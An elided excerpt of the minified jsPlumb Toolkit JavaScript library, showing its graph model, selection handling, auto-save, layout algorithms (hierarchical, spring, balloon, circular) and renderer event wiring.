              Array.prototype.push.apply(q, a);
          else
              for (var c = 0; c < a.length; c++)
                  this.addElement(a[c]);
          return this
  ...
  var a = this
    ...
    , v = function(a, b) {
      ...
      this.compile = function(a, b) {
          ...
          return !0 === this.remove || b || (g += "_le=_els.pop();",
      ...
      update: function(a, b) {
          ...
          if (null != g && null != a._rotors) {
              ...
              for (var j = 0; j < f.length; j++)
                  for (var k = f[j], l = 0; l < k[1].length; l++)
                      try {
                          k[1][l](k[0], k[2])
                      } catch (a) {}
          }
...
function() {
  jsPlumbUtil.FilterableDataset = function(a) {
      ...
      this.filter = function(a, c) {
          var d = "function" == typeof a ? a : function(b) {
              var d = b.data
                , e = !1;
              for (var f in a) {
                  var g = a[f] === d[f];
...
function() {
  ...
  b.Connection.prototype.animateOverlay = function(a, f) {
      ...
      f = f || {};
      var j, k, l, m = c.uuid(), n = !1 !== f.forwards, o = f.rate || 30, p = f.dwell || 250, q = f.speed || 100, r = i / q * 1e3, s = r / o, t = 1 / s * (n ? 1 : -1), u = !1 !== f.isFinal, v = n ? 0 : 1, w = v, x = function() {
          return n ? w >= 1 : w <= 0
      ...
      var B = function() {
        ...
        , E = function() {
          ...
          var tracetimer = window.setTimeout(function() {
          ...
          g.edge && (g.edge.clearTraceTimer = function(){clearTimeout(tracetimer);clearInterval(j)})
      };
...
function() {
  ...
  a.jsPlumbUtil.AutoSaver = function(a, g, h, i, j, k, l) {
      function m(a) {
          return function() {
  ...
  ,
  a.jsPlumbUtil.CatchAllEventHandler = function(a) {
      var g = function() {
          a.fire("dataUpdated")
      };
      f(b, c, a, g),
...
function() {
  ...
  b.Selection = function(a) {
      ...
      var c, d = a.toolkit, e = [], f = [], g = [], h = Math.Infinity, i = Math.Infinity, j = Math.Infinity, k = a.generator, l = {}, m = this, n = a.onClear || function() {}
      , o = function(a) {
          ...
          if (e.length >= f) {
              if (c === b.Selection.DISCARD_NEW)
                  return !1;
              d = e.splice(0, 1),
              q(d[0], "Removed"),
              delete l[d[0].getFullId()]
          }
          return e.push(a),
          q(a, "Added"),
          d
      ...
      var r = function(a, b) {
        ...
        , s = function(a, c) {
          return b.removeWithFunction(o(a), function(b) {
              return b.id == a.id
          }) && q(a, "Removed"),
          delete l[a.getFullId()],
          c && c(a, !1),
          [[], []]
      }
        , t = function(a, b) {
          return l[a.getFullId()] ? s(a, b) : r(a, b)
      }
        , u = function(a, c, e) {
          var f, g = [], h = [];
          if (null == a)
          ...
          var i = function(a) {
              var j;
              if (b.isString(a))
                  null != (j = d.getNode(a) || d.getEdge(a) || d.getGroup(a)) && (f = c(j, e),
                  g.push.apply(g, f[0]),
                  h.push.apply(h, f[1]));
      ...
      d.bind("edgeTarget", function(a) {
          l[a.edge.getFullId()] && m.fire("edgeTarget", a)
      }),
      d.bind("edgeSource", function(a) {
          l[a.edge.getFullId()] && m.fire("edgeSource", a)
      }),
      d.bind("nodeUpdated", function(a) {
          l[a.node.getFullId()] && m.fire("nodeUpdated", a)
      }),
      d.bind("groupUpdated", function(a) {
          l[a.group.getFullId()] && m.fire("groupUpdated", a)
      }),
      d.bind("edgeUpdated", function(a) {
          l[a.edge.getFullId()] && m.fire("edgeUpdated", a)
      }),
      d.bind("portUpdated", function(a) {
          l[a.port.getFullId()] && m.fire("portUpdated", a)
      }),
      this.remove = function(a, b) {
          return u(a, s, b)
      }
      ...
      this.clear = function(a) {
          ...
          f.length = 0,
          l = {},
          m.fire("graphClearStart"),
          a || n(this)
      }
      ,
      d.bind("graphCleared", function() {
          this.clear()
      }
      .bind(this)),
      d.bind("dataLoadEnd", function() {
          this.reload()
      }
      .bind(this)),
      ...
      this.each = function(a, c) {
          for (var d = "Edge" === c ? g : "Group" === c ? f : e, h = 0; h < d.length; h++)
              try {
                  a(h, d[h])
              } catch (a) {
      ...
      this.getAll = function() {
          var a = [];
          return Array.prototype.push.apply(a, e),
      ...
      var v = function(a) {
          for (var b = [], c = 0; c < a.length; c++)
              null != l[a[c].getId()] && b.push(a[c]);
          return b
      };
      this.getAllEdgesFor = function(a, b) {
          return v(a.getAllEdges({
              filter: b
          }))
      }
      ,
      this.getSourceEdgesFor = function(a) {
          return v(a.getSourceEdges())
      }
      ,
...
function() {
  ...
  var c = function(a, b) {
    ...
    , i = b.Edge = function(a) {
      ...
      this.inspect = function() {
          if (null != e)
              return "{ id:" + e + ", connectionId:null, cost:" + b + ", directed:" + d + ", source:" + this.source.id + ", target:" + this.target.id + "}"
      }
  }
    ...
    , l = (b.Graph = function(a) {
      ...
      this.deleteVertexFromGroup = function(a) {
          (a = z(a)) && a.group && (a.group.deleteVertex(a),
          x(a))
      }
      ,
    ...
    , p = {
      compute: function(a) {
          ...
          for (var C = new Array(b.vertices.length), D = 0, E = function(a, b, c, d) {
              ...
              if (!F.node || u(F.node) == 1 / 0)
                  break;
              if (d && (G == q(d) || !p && F.node.isChildOf && F.node.isChildOf(d)) && (j.path = n(g, h, i, d, q),
              j.pathDistance = j.path[j.path.length - 1].cost,
              !k))
                  break;
              C[F.index] = !0,
              D += 1,
              E(F, F.node.getAllEdges(), function(a) {
...
function() {
  ...
  a.jsPlumbToolkitInstance = function(h) {
      ...
      var i = h.idFunction || g
        ...
        , m = h.typeFunction || function(a) {
          return a[j] || f
      }
        , n = h.edgeIdFunction || i
        , o = h.edgeTypeFunction || function(a) {
          return a[k] || f
      }
        , p = h.portIdFunction || i
        , q = h.portTypeFunction || function(a) {
          return a[l] || f
      }
        , r = h.portExtractor
        , s = h.portUpdater
        ...
        , F = h.saveUrl
        , G = h.saveHeaders
        , H = h.onAutoSaveSuccess || function() {}
        , I = h.onAutoSaveError || function() {}
        , J = !0 === h.doNotUpdateOriginalData
        , K = h.onBeforeAutoSave || function() {}
        , L = h.onAfterAutoSave || function() {}
        , M = {
        ...
        , N = !0 === h.createMissingGroups;
      null != t && null == r && (r = function(a) {
          var b = a[t] || [];
          return null != u && b.sort(function(a, b) {
              var c = a[u]
                , d = b[u];
      ...
      null != t && null == s && (s = function(a, b, c) {
          var d = {};
          return null != u && c.sort(function(a, b) {
              var c = a.data[u]
                , d = b.data[u];
              return (null == c ? 1 / 0 : c) - (null == d ? 1 / 0 : d)
          }),
      ...
      var O = new d.Graph(M);
      E && new b.AutoSaver(this,F,G,H,I,K,L),
      ...
      ;
      var P, Q = function() {
          return null == P && (P = new a.jsPlumbToolkit.Model(y || {})),
          P
      }, R = function(a, b) {
          if (null == y)
              return !0;
      ...
      .bind(this);
      this.beforeConnect = h.beforeConnect || R,
      this.beforeMoveConnection = h.beforeMoveConnection || R,
      this.beforeStartConnect = h.beforeStartConnect || function(a, b) {
          return {}
      }
      ,
      ...
      this.connect = function(a) {
          ...
          var b;
          if (!w) {
              var d = O.getVertex(a.source)
                , e = O.getVertex(a.target)
                , f = a.cost
                , g = a.directed;
              if (!d) {
                  if (a.doNotCreateMissingNodes)
                      return;
                  d = O.addVertex(a.source),
                  v.fire("nodeAdded", {
                      data: {},
                      node: d
                  })
              ...
              if (i) {
                  ...
                  !1 !== this.beforeConnect(d, e, h) && (b = O.addEdge({
                      source: d,
                      target: e,
                      cost: f,
                      directed: g,
      ...
      this.eachNode = function(a) {
          for (var b, c = 0, d = O.getVertexCount(); c < d; c++)
              b = O.getVertexAt(c),
              a(c, b)
      }
      ,
      this.eachGroup = function(a) {
          for (var b, c = 0, d = O.getGroupCount(); c < d; c++)
              b = O.getGroupAt(c),
              a(c, b)
      }
      ,
      this.eachEdge = function(a) {
          for (var b = O.getEdges(), c = 0, d = b.length; c < d; c++)
              a(c, b[c])
      }
      ,
      this.getEdgeCount = function() {
      ...
      ,
      this.getType = function(a) {
          return ("Node" === a.objectType ? m : "Port" === a.objectType ? q : o)(a.data) || "default"
      }
      ,
      ...
      this.addNode = function(c, d, e) {
          ...
          if (null != g) {
              ...
              return Y || J || a.jsPlumbToolkitIO.manage("addNode", W, X, g, i || O.getIdFunction(), v),
              e || v.fire("nodeAdded", {
                  data: c,
                  node: g,
                  eventInfo: d
      ...
      this.addFactoryNode = function(a, b, c) {
          arguments.length < 3 && (2 === arguments.length ? (b = "object" == typeof arguments[1] ? arguments[1] : {},
          c = "function" == typeof arguments[1] ? arguments[1] : null) : 1 === arguments.length && (b = {})),
          b.type = b.type || a,
          A(a, b, function(a) {
      ...
      this.addNodes = function(a) {
          for (var b = 0; b < a.length; b++)
              v.addNode.apply(v, [a[b]]);
          return v
      }
      ,
      this.addGroup = function(c, d, e) {
          null == i(c) && "string" != typeof c && (c.id = b.uuid());
          var f = O.addGroup(c, i);
          return Y || J || a.jsPlumbToolkitIO.manage("addGroup", W, X, f, i || O.getIdFunction(), v),
          e || v.fire("groupAdded", {
              data: c,
              group: f,
              eventInfo: d
      ...
      this.removeGroup = function(b, c, d) {
          ...
          if (e && e.obj) {
              ...
              return g && (Y || J || a.jsPlumbToolkitIO.manage("removeGroup", W, X, g, i || O.getIdFunction(), v),
              d || v.fire("groupRemoved", {
                  group: g,
                  removeChildNodes: c,
                  nodes: f
              })),
      ...
      ,
      this.getPort = function(a) {
          var b = O.getVertexByPortId(a);
          if (b)
              return b.getPort(O.splitPortId(a)[1])
      }
      ,
      this.exists = function(a) {
          for (var b = 0; b < arguments.length; b++)
              if (null == O.getVertex(arguments[b]))
                  return !1;
          return !0
      }
      ,
      this.removeNode = function(b, c) {
          b = b.constructor === d.Vertex || b.constructor === d.Port ? b : O.getVertex(b);
          for (var e = b.getAllEdges() || [], f = 0; f < e.length; f++)
              v.removeEdge(e[f]);
          return O.deleteVertex(b.id),
          Y || J || a.jsPlumbToolkitIO.manage("removeNode", W, X, b, i || O.getIdFunction(), v),
          c || v.fire("nodeRemoved", {
              node: b,
              nodeId: b.id,
              edges: e
          }),
      ...
      this.addEdge = function(b, c, d) {
          var e = O.addEdge(b, n, this.beforeConnect);
          return Y || J || a.jsPlumbToolkitIO.manage("addEdge", W, X, e, n || O.getIdFunction(), v),
          d || v.fire("edgeAdded", {
              edge: e,
              source: c,
              geometry: b.geometry,
      ...
      this.removeEdge = function(b, c) {
          return b = O.getEdge(b),
          null != b && (O.deleteEdge(b),
          Y || J || a.jsPlumbToolkitIO.manage("removeEdge", W, X, b, n || O.getIdFunction(), v),
          v.fire("edgeRemoved", {
              edge: b,
              source: c
          }, null)),
      ...
      this.setTarget = function(a, b, c) {
          ...
          return !1 === d.success || c || v.fire("edgeTarget", d),
          d
      }
      ,
      this.setSource = function(a, b, c) {
          var d = O.setSource.apply(O, arguments);
          return !1 === d.success || c || v.fire("edgeSource", d),
          d
      }
      ,
      this.addNewPort = function(b, c, d, e) {
          ...
          C({
              ...
              f.data = c,
              T(b),
              Y || J || a.jsPlumbToolkitIO.manage("addPort", W, X, {
                  node: b,
                  port: f
              }, p || O.getIdFunction(), v),
              e || v.fire("portAdded", {
      ...
      this.removePort = function(a, b, c) {
          var e = !1;
          a = a.constructor === d.Vertex || a.constructor === d.Port ? a : O.getVertex(a);
          var f = a.getPort(b);
          if (f) {
              var g = f.getAllEdges();
              ...
              try {
                  if (!b.obj || "Node" !== b.type && "Edge" !== b.type && "Group" !== b.type) {
                      for (; a.getNodeCount() > 0; )
                          v.removeNode(a.getNodeAt(0));
                      for (; a.getEdgeCount() > 0; )
                          v.removeEdge(a.getEdgeAt(0));
                      for (; a.getGroupCount() > 0; )
                          v.removeGroup(a.getGroupAt(0))
                  } else
                      v["remove" + b.type](b.obj)
              } finally {
      ...
      this.updateEdge = function(a, d) {
          ...
          if (e) {
              ...
              if (d)
                  for (var g in d)
                      null == e.data[g] ? e.data[g] = d[g] : b.replace(e.data, g, d[g]);
              v.fire("edgeUpdated", {
                  edge: e,
                  updates: d || {},
                  originalData: f
      ...
      ;
      var U = function(a) {
          return null == a ? null : "*" === a ? O : a.constructor === d.Vertex || a.constructor === d.Port ? a : b.isString(a) || b.isObject(a) ? O.getVertex(a) : null
      };
            ...
            , h = function(e, f, h, i) {
              if (null != e)
                  for (var j = e[b]({
                      ...
                      var l = f && e === O || j[k].source === e || c && j[k].source.constructor === d.Port && j[k].source.getNode() === e
                        , m = h && e === O || j[k].target === e || c && j[k].target.constructor === d.Port && j[k].target.getNode() === e;
                      (f && l || h && m || i && (l || m)) && g(j[k])
                  }
          };
          return h(U(a.source), !0, !1, !1),
          h(U(a.target), !1, !0, !1),
          h(U(a.element), !1, !1, !0),
          e
      };
      ...
      h.maxSelectedNodes && _.setMaxNodes(h.maxSelectedNodes),
      h.maxSelectedEdges && _.setMaxEdges(h.maxSelectedEdges),
      h.selectionCapacityPolicy && _.setCapacityPolicy(h.selectionCapacityPolicy);
      ...
      var da = function(a) {
        ...
        , ea = {};
      if (this.render = function(d, e) {
          var f = c.extend({}, e || {});
          if (c.extend(f, d),
          f.toolkit = v,
          null == f.container)
              throw new Error("jsPlumbToolkit: You must specify a `container` into which to render");
          null != d.selection && (d.selection.constructor === b.Selection ? f.toolkit = d.selection : f.toolkit = new b.Selection({
          ...
          return ea[i] = h,
          h.id = i,
          null != d.selection && (h.reload = f.toolkit.reload.bind(f.toolkit)),
      ...
      this.getObjectInfo = function(a, d) {
          var e = {
            ...
            , g = function(a) {
              var b = {};
              for (var c in ea)
                  b[c] = [ea[c], ea[c].getRenderedElement(a)];
              return b
          };
          if (null != a) {
              ...
              if (null != h && h.jtk)
                  e.el = h,
                  e.obj = h.jtk.port || h.jtk.node || h.jtk.group;
              else if (null != a.tagName) {
                  var j = f(h);
                  null != j && (e.el = j,
                  e.obj = j.jtk.port || j.jtk.node || j.jtk.group)
              } else {
                  if ("string" == typeof a) {
                      var k = this.getNode(a) || this.getGroup(a) || this.getPort(a);
                      a = k
                  } else
                      "object" == typeof a && void 0 === a.objectType && (a = this.getNode(i(a)));
                  if (null == a)
                      return e;
                  e.obj = a,
                  null != d && (e.el = d(a))
  ...
  ,
  b.extend(a.jsPlumbToolkitInstance, [b.FilterableDataset, b.EventGenerator]),
...
function() {
  ...
  b.Model = function(a, d) {
      ...
      if (void 0 !== d) {
          ...
          for (f in a.ports)
              e = k(f),
              d.registerEndpointType(f, e);
          if (a.states)
              for (var o in a.states)
                  g[o] = new b.UIState(o,a.states[o],d)
      }
      return {
          getNodeDefinition: i,
          getEdgeDefinition: j,
  ...
  var a = this
    ...
    , e = function(a, b, c) {
      ...
      for (var j = 0; j < f.length; j++)
          if (f[j].nodeId) {
              ...
              if (l) {
                  ...
                  m.id = b.getGraph().splitPortId(f[j].id)[1],
                  l.addPort(m)
              }
          } else
              jsPlumbUtil.log("could not add port with definition " + f[j] + "; no nodeId or id found");
      for (var n = 0; n < e.length; n++) {
          ...
          e[n].geometry && (o.geometry = e[n].geometry),
          b.addEdge(o)
      }
  }
    , f = function(a, b) {
  ...
  b.Support = {
      ingest: function(c) {
          ...
          var e = b.newInstance()
            ...
            , p = [];
          if (c.nodeSelector)
              for (var q = d.getContainer().querySelectorAll(c.nodeSelector), r = 0; r < q.length; r++) {
                  var s = d.getId(q[r]);
                  p.push.apply(p, n(q[r], s)),
                  d.manage(s, q[r])
              }
          var t = d.getManagedElements();
          for (var s in t)
              p.push.apply(p, n(t[s].el, s));
          ...
          m) {
              ...
              return v.ingest = function(a, b) {
                  d.getContainer().appendChild(a);
                  var c = n(a, b);
                  v.importNode(a, i(a));
                  for (var e = 0; e < c.length; e++)
                      v.ingestEndpoint.apply(v, c[e])
              }
              ,
              v
          }
...
function() {
  ...
  c.AbstractLayout = function(b) {
      ...
      var i = 10
        ...
        , p = a.Farahey.getInstance({
          ...
          padding: n.padding,
          filter: function(a) {
              return (!B[a] || !B[a].group) && (!j.canMagnetize || j.canMagnetize(a))
          }
      })
      ...
      this.nodeAdded = function(a, b) {
          if (j.adapter.filter(a.node)) {
              var c = b && b.position ? b.position : a.node.data && a.node.data.left && a.node.data.top ? a.node.data : j.adapter.getOffset(a.el);
              if (this._nodeAdded) {
      ...
      this.groupAdded = function(a, b) {
          if (j.adapter.filter(a.group)) {
              var c = b && b.position ? b.position : a.group.data && a.group.data.left && a.group.data.top ? a.group.data : j.adapter.getOffset(a.el);
              if (this._groupAdded) {
      ...
      var P = function(a, b) {
        ...
        , R = function(a, b, c, d) {
          ...
          if (!e) {
              if (null != b && null != c)
                  ...
                  if (d)
                      return null;
                  e = [Math.floor(Math.random() * (L + 1)), Math.floor(Math.random() * (M + 1))]
              }
              U(a, e[0], e[1])
          }
          return e
        ...
        , T = function(a, b, c) {
          B[a] && j._nodeMoved ? j._nodeMoved(a, b, c) : C[a] && j._groupMoved && j._groupMoved(a, b, c)
      }
        , U = (this.setMagnetizedPosition = function(a, b, c, d) {
          S(a, b, c),
          this.magnetize({
              options: {
                  filter: function(b) {
      ...
      function(a, b, c, d) {
        ...
        , W = function() {
          for (var a in v)
              console.log(a, v[a][0], v[a][1])
      }
        , X = function(a) {
          var b = o(a);
          if (null != b) {
              var d = c(a).position;
              return j.adapter.setElementPosition(b, d[0], d[1]),
              d.concat(P(a))
          }
          return null
      }
      ...
      var ba = function(a) {
          if (null != u) {
              l(),
              p.setElements(m.getElements()),
              this.begin && this.begin(u, n);
              for (var b = function() {
                  g(),
                  Y(function() {
                      q && j.magnetize(),
  ...
  c.AbstractHierarchicalLayout = h
}
.call("undefined" != typeof window ? window : this),
function() {
  "use strict";
  ...
  c.Circular = function(a) {
      ...
      this.step = function(a, c) {
          var f, g, h = b.adapter.getElements(), i = 0, j = 0, k = 10;
          if (e) {
...
function() {
  ...
  c.Hierarchical = function(a) {
      var b, e, h, i, j, k, l, m = c.AbstractHierarchicalLayout.apply(this, arguments), n = [], o = null != a.parameters ? a.parameters.spacing : g, p = null != a.parameters && null != a.parameters.compress ? !0 === a.parameters.compress : o === f.compress, q = null != a.parameters && !0 === a.parameters.invert, r = null != a.parameters ? a.parameters.align || "center" : "center", s = [], t = [], u = m.toolkit.getNodeId, v = function(a) {
          var b = s[a];
          return b || (b = {
              entries: [],
              pointer: 0
          ...
          var f = v(c)
            ...
            , i = b[0 == h ? 1 : 0];
          return null == n[c] ? n[c] = i : n[c] = Math.max(n[c], i),
          f.pointer += b[h] + j[h],
          f.entries.push(g),
          d && d.children.push(g),
          g
          ...
          return a.parents.length > 0 ? a.parents[a.parents.length - 1].childGroupIndex : null
      }, E = function(a, b) {
          ...
          if (a.size > 0) {
              ...
              "end" !== r && b >= d || "end" === r && b <= d ? a.loc = b : (e = d - b,
              a.loc = d);
              for (var i = a.loc, k = "end" === r ? a.nodes.length - 1 : 0, l = "end" === r ? -1 : a.nodes.length, m = "end" === r ? -1 : 1, n = k; n !== l; n += m)
                  a.nodes[n].loc = i,
                  i += a.nodes[n].size,
                  i += j[h];
              0 !== e && J(a),
          ...
          if (!k[a.node.id]) {
              ...
              for (Array.prototype.push.apply(d, l(a.node, m.toolkit)),
              c = 0; c < d.length; c++) {
                  var n = K(a.node, d[c]) ? d[c].target : d[c].source;
                  if (n.getNode && (n = n.getNode()),
                  null != (n = m.toolkit.getNode(n)) && n !== a.node && !g[n.id]) {
                      ...
                      if (null != p) {
                          ...
                          var q = y(p)
                            ...
                            , t = s - p.loc
                            , x = function(a) {
                              for (var b = a.childGroupIndex; b < a.childGroup.nodes.length; b++)
      ...
      this.step = function(a, b) {
          for (var c, e, f, g = d.isArray(b.rootNode) ? b.rootNode : [b.rootNode], i = 0; i < g.length; i++) {
              c = g[i];
              var k = m.getSize(c.id)
                , l = w(c, k, 0, null, null);
              l.root = !0,
              L(l, 0, null);
              var o, r, t = 0, v = function(a, b) {
                  var c = 0 === h ? 1 : 0;
                  return p && a.parents && a.parents.length > 0 ? m.getPosition(u(a.parents[0].node))[c] + E(a, c) + j[c] : b
              };
              for (e = 0; e < s.length; e++) {
                  for (s[e].otherAxis = t,
                  f = 0; f < s[e].entries.length; f++)
                      o = 0 === h ? s[e].entries[f].loc : v(s[e].entries[f], t),
                      r = 1 === h ? s[e].entries[f].loc : v(s[e].entries[f], t),
                      m.setPosition(u(s[e].entries[f].node), o, r, !0);
                  q ? e < s.length - 1 && (s[e].otherAxisSize = n[e + 1] + j[0 === h ? 1 : 0],
                  t -= s[e].otherAxisSize) : (s[e].otherAxisSize = n[e] + j[0 === h ? 1 : 0],
                  t += s[e].otherAxisSize)
              }
          }
          m.setDone(!0)
...
function() {
  ...
  c.Spring = function(a) {
      ...
      var d, e = jsPlumbUtil.merge(this.defaultParameters, a.parameters || {}), f = {}, g = !1 !== a.absoluteBacked, h = 0, i = 1 / 0, j = -1 / 0, k = 1 / 0, l = -1 / 0, m = 1, n = 1, o = 0, p = function(a) {
  ...
  c.Balloon = function(a) {
      ...
      var i = function(a, c, g) {
          ...
          for (h = 0; h < v.length; h++) {
              ...
              p.childMap[w.id] || (p.childMap[w.id] = !0,
              p.children.push(w))
          }
          if (l = u(p.focus.id),
          k = Math.max(l[0], l[1]),
          ...
          p.children.length > 0) {
              ...
              for (h = 0; h < p.children.length; h++) {
                  ...
                  if (J = d.calculateSpacingAdjustment(n, A),
                  M = Math.sqrt(Math.pow(A.x + J.left - r, 2) + Math.pow(A.y + J.top - s, 2)),
                  k = Math.max(k, M),
              ...
              for (y = z,
              h = 0; h < p.children.length; h++)
                  j = p.children[h],
                  p.setIncidentAngle(j.id, y),
                  p.setPosition(j.id, r + Math.sin(y) * k, s + Math.cos(y) * k, !0),
                  y += x;
              var N, O = p.positions[a.id][0], P = e.getSize(a.id), Q = O + P[0], R = p.positions[a.id][1], S = R + P[1];
              for (h = 0; h < p.children.length; h++) {
                  j = p.children[h];
                  i(j, {
                      parent: a,
              ...
              for (p.extents = [O, Q, R, S],
              p.offsets = {},
              h = 0; h < p.group.length; h++) {
                  var T = p.group[h];
                  p.offsets[T.id] = {
...
function() {
  ...
  b.UI.ActiveDragFilter = function(a, b, c) {
      ...
      b.bind("connectionDrag", function(b) {
          ...
          var f, g, h, i, j, k = b.source.jtk.port, l = k ? k.getNode() : b.source.jtk.node, m = c.getNodeCount(), n = c.getGroupCount();
          if (k)
              for (e(k, l),
              g = l.getPorts(),
              h = 0; h < g.length; h++)
...
function() {
  ...
  b.createElement = function(a, b) {
      ...
      return null != b && e.appendElement(f, b),
      f
  }
  ;
  var l = function(a) {
  ...
  var m = function(a) {
    ...
    , o = function(a, b) {
      ...
      this.filter = function(a) {
          return !!b || ("Group" === a.objectType || "Node" === a.objectType && null == a.group)
      }
      ,
      this.getElements = function() {
          var c = a.getNodes();
          return b || (c = c.filter(function(a, b) {
              return null == a.group
          }),
    ...
    , p = function(a) {
      ...
      function p(a, b, c, d, f, g, h, i, j) {
          ...
          b.jtk[d] = a,
          b.jtk.node = g,
          j && M && Ya.makeDraggable && Ya.makeDraggable(b, f.dragOptions),
          N && Ya.makeDroppable && Ya.makeDroppable(b, f.dropOptions);
          var k = function(a) {
              $.on(b, a, function(c) {
                  var d = {
                      el: b,
      ...
      function t(a, b, c) {
          if (null == a.value("jtk-processed")) {
              ...
              null != d.portId && (ia[b.id + "." + d.portId] = a.element,
              a.element.jtk = a.element.jtk || {},
              a.element.jtk.port = I.addPort(b, {
                  id: d.portId,
              ...
              if ("true" === a.value("is-source") && (d.isSource = !0),
              ...
              "true" === a.value("endpoint")) {
                  ...
                  (a.element._katavorioDrop ? a.element._katavorioDrop.length : 0) > k && (j = a.element._katavorioDrop[a.element._katavorioDrop.length - 1]),
                  G.onUpdate(a.element, function(a, c) {
                      var d = e.getSelector(a, "jtk-source");
                      if (1 === d.length) {
                          var f = Ua(d[0], b);
                          f.scope && ($.setSourceScope(a, f.scope, f.edgeType),
                          j && j.k.setDropScope(j, f.scope))
                      }
                  })
              }
          }
      ...
      function u(a, b, c) {
          if (null == a.value("jtk-processed")) {
              a.setValue("jtk-processed", !0);
              var d = Ua(a, b, c);
              if (d.rank = "Node" === b.objectType ? 10 : 0,
              null != d.portId && (ia[b.id + "." + d.portId] = a.element,
              a.element.jtk = a.element.jtk || {},
              a.element.jtk.port = I.addPort(b, {
                  id: d.portId,
              ...
              "true" === a.value("endpoint")) {
                  ...
                  G.onUpdate(a.element, function(a, c) {
                      var d = e.getSelector(a, "jtk-target");
                      if (1 === d.length) {
                          var f = Ua(d[0], b);
                          f.scope && (g.targetDef.def.scope = f.scope,
                          g.k.setDropScope(g, f.scope))
                      }
                  })
              }
          }
      ...
      function v(a) {
          ...
          if (b && b.obj) {
              ...
              a.doNotUpdateElement || ($.setAbsolutePosition(b.el, [a.x, a.y], a.animateFrom, a.animateOptions),
              $.revalidate(b.el))
          }
          return b
      }
      ...
      function y(a, b, c) {
          var d = pa(a);
          if (d) {
              (!b || w(d)) && (d.setVisible(b),
              c || (x(d, d.endpoints[0], b),
              x(d, d.endpoints[1], b)))
          }
      }
      function z(a, b) {
      ...
      function A(a) {
          return a instanceof $.getDefaultConnectionType() && (a = a.edge),
      ...
      var B = function(a, b) {
        ...
        , Q = a.templateRenderer ? d.isString(a.templateRenderer) ? D[a.templateRenderer] : {
          render: a.templateRenderer
      } : D[E]
        , R = !1 !== a.enhancedView
        , S = a.assignPosse || function() {
          return null
      }
      ...
      $.bind("beforeDrop", function(a) {
          var b = a.connection
            ...
            , g = a.connection.edge;
          return null == g ? I.beforeConnect(e, f, a.connection.getData()) : I.beforeMoveConnection(e, f, g)
      }),
      $.bind("beforeDrag", function(a) {
          ...
          if (F) {
              ...
              console.log("\n------------------------\nDrag started with edge type `" + d + "`, having definition :"),
              console.log(f),
              console.log("Edge source is a " + c.objectType + ", having type [" + c.getType() + "], with definition :");
          ...
          return !1 === e && a.endpoint.isTemporarySource && a.endpoint._deleteOnDetach && $.deleteEndpoint(a.endpoint),
          e
      }),
      ...
      ,
      a.events)
          for (var da in a.events)
              this.bind(da, a.events[da]);
      if (a.interceptors)
          for (var ea in a.interceptors)
              this.bind(ea, a.interceptors[ea]);
      var fa = !1;
      ca(k.connection, function(a) {
          if (null == a.connection.edge) {
              a.sourceEndpoint.getParameter("nodeId") || a.sourceEndpoint.setParameter("nodeId", ha[a.sourceEndpoint.elementId].id),
              a.targetEndpoint.getParameter("nodeId") || a.targetEndpoint.setParameter("nodeId", ha[a.targetEndpoint.elementId].id);
              ...
              !1 === I.getEdgeFactory()(d, a.connection.getData() || {}, function(b) {
                  l.edge = I.addEdge({
                      source: i,
                      target: j,
      ...
      ca(k.connectionMoved, function(a) {
          ...
          b(function() {
              I.edgeMoved(a.connection.edge, d.port || d.node || d.group, a.index)
          })
      }),
      ...
      ca(k.groupDragStop, function(a) {
          ...
          a.uigroup = a.group,
          H.fire(k.groupMoveEnd, e.extend(a, {
              group: I.getGroup(a.uigroup.id)
          }))
      }),
      ca(k.groupMemberAdded, function(a) {
          if (!O && a.el.jtk && a.el.jtk.node) {
              var b = null == a.sourceGroup ? null : I.getGroup(a.sourceGroup.id)
                , c = I.addToGroup(a.el.jtk.node, a.group.id, b);
              c && (a.el._droppedOnGroup = !0,
      ...
      ca(k.groupMemberRemoved, function(a) {
          if (!O && a.el.jtk && a.el.jtk.node) {
              var b = null == a.targetGroup ? null : I.getGroup(a.targetGroup.id)
                , c = I.removeFromGroup(a.el.jtk.node, !1, b);
              c && (H.nodeRemovedFromGroup(a.el),
      ...
      if (!1 !== this.bindToolkitEvents) {
          ...
          var za = function(a, b, c) {
            ...
            , Aa = function(a, b) {
              ...
              if (null == c) {
                  ...
                  null == a.group || X ? H.append(c, d, b ? b.position : null) : za(c, a, a.group),
                  ua(c, a),
                  Xa(c, a);
                  var e = {
                      node: a,
          ...
          l(k.groupMemberAdded, function(a) {
              var b = ga[a.node.id];
              b && (H.fire(k.groupMemberAdded, e.extend(a, {
                  el: b,
          ...
          l(k.groupMemberRemoved, function(a) {
              var b = ga[a.node.id];
              if (b) {
                  if (H.fire(k.groupMemberRemoved, e.extend(a, {
                      el: b,
                      groupEl: ja[a.group.id]
                  })),
          ...
          var Ba = function(b, c) {
              if (!X) {
                  ...
                  if (null == f) {
                      ...
                      l.dragOptions[e.dragEvents[g.stop]] = d.wrap(l.dragOptions[e.dragEvents[g.stop]], function(a) {
                          a.el.jtk && a.el.jtk.group && (l.dragOptions.magnetize ? a.pos = H.getLayout().setMagnetizedPosition(a.el.jtk.group.id, a.pos[0], a.pos[1], !0) : H.getLayout().setPosition(a.el.jtk.group.id, a.pos[0], a.pos[1], !0),
                          !1 !== V && (H.storePositionInModel({
                              id: a.el.jtk.group.id,
                              group: !0,
                              leftAttribute: T,
                              topAttribute: U
                          }),
                          I.fire(k.groupUpdated, {
          ...
          var Ca = function(a, b) {
              var c = $.getGroup(a.id)
                ...
                , f = b.maxSize || [e[2], e[3]];
              if (d.style.width = Math.min(f[0], e[2]) + "px",
          ...
          var Ea = function(b, c) {
              return function() {
                  ...
                  I.isDebugEnabled() && console.log("Renderer", "adding edge with params", c);
                  var d = $.connect(c);
                  d.edge = b,
                  oa[b.getId()] = d,
                  sa(c.type, b, d),
                  ...
                  var e = b.source.getNode ? b.source.getNode() : b.source
                    , f = ga[e.id] || ja[e.id]
                    , g = b.target.getNode ? b.target.getNode() : b.target;
                  return !1 !== (ga[g.id] || ja[g.id])._jtkVisible && !1 !== f._jtkVisible || y(b, !1),
                  d
              }
          };
          l(k.edgeAdded, function(b) {
              if (!fa && b.source !== H) {
                  var c = b.edge;
                  if (W(c.source) && W(c.target) && (!X || c.source.objectType !== g.groupType && c.target.objectType !== g.groupType)) {
                      var d = Fa.getEdgeDefinition(I.getEdgeType(c.data || {}));
                      if (d && !0 === d.ignore)
                          return;
                      var e = Ea(c, d);
                      if (a.connectionHandler)
                          a.connectionHandler(c, e, H);
                      else {
                          var f = e();
                          if (c.geometry) {
          ...
          l(k.edgeRemoved, function(a) {
              if (!fa && a.source !== H) {
                  var b = a.edge
                    , c = oa[b.getId()];
